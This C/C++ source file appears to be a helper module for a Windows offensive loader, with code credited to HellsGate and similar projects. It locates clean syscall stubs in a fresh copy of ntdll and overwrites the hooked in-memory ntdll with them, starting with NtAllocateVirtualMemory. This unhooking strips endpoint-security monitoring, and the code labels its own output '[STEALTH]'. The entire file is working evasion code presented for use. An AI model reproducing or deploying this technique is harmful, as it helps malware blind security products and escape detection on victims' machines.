#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "Helpers.h"


#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)

//Refer -> https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h


//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

//also: https://github.com/dosxuz/PerunsFart/blob/main/helper.h

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
	//Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
	PVOID funcAddress = 0x00;
	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (std::strcmp(findfunction, pczFunctionName) == 0)
		{
			WORD cw = 0;
			while (TRUE)
			{
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
				{
					return 0x00;
				}

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
				{
					return 0x00;
				}

				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					WORD syscall = (high << 8) | low;
					//printf("Function Name : %s", pczFunctionName);
					//printf("Syscall : 0x%x", syscall);
					return pFunctionAddress;
					break;
				}
				cw++;
			}
		}
	}
	return funcAddress;
}

DWORD ChangePerms(PVOID textBase, DWORD flProtect, SIZE_T size)
{
	DWORD oldprotect;
	VirtualProtect(textBase, size, flProtect, &oldprotect);
	return oldprotect;
}

BOOL OverwriteNtdll(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (strstr(pczFunctionName, (CHAR*)"Nt") != NULL)
		{
			PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
			if (funcAddress != 0x00 && std::strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
			{
				if (strcmp(pczFunctionName, "NtAllocateVirtualMemory") == 0) {
					printf("[STEALTH] Function Name : %s\n", pczFunctionName);
					printf("[STEALTH] Address of Function: 0x%p\n", funcAddress);

					//Change the write permissions of the .text section of the ntdll in memory
					DWORD oldprotect = ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
					if (oldprotect == 0) {
						// Failed to change memory protection, return failure
						return FALSE;
					}

					//Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
					if (std::memcpy((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23) == NULL) {
						// Failed to copy memory, return failure
						return FALSE;
					}

					//Change back to the old permissions
					if (ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize) == 0) {
						// Failed to change memory protection, return failure
						return FALSE;
					}
				}
			}
		}
	}

	// Return success
	return TRUE;
}

BOOL Execute(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		printf("Error getting ImageExportDirectory\n");

	PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
		printf("Error gettong ImageExportDirectory\n");

	BOOL overwrite = OverwriteNtdll(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
	if (overwrite)
	{
		return TRUE;
	}
	return FALSE;
}